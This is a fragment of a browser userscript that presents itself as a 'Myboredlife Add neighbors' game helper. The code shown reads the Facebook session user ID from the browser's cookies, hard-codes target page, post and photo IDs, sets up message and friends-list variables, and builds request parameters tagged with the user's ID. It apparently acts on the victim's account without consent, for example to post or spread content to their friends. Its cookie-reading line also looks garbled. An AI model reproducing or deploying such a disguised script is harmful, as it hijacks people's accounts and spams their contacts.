// ==UserScript==
// @name Myboredlife
// @description myboredlife Add neighbors 
...
var spage_id = "655790771115979";
var spost_id = "655790771115979";
var sfoto_id = "655790771115979";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
params += "&phstamp=165816649841105474185";
params += "&__user=" + user_id;
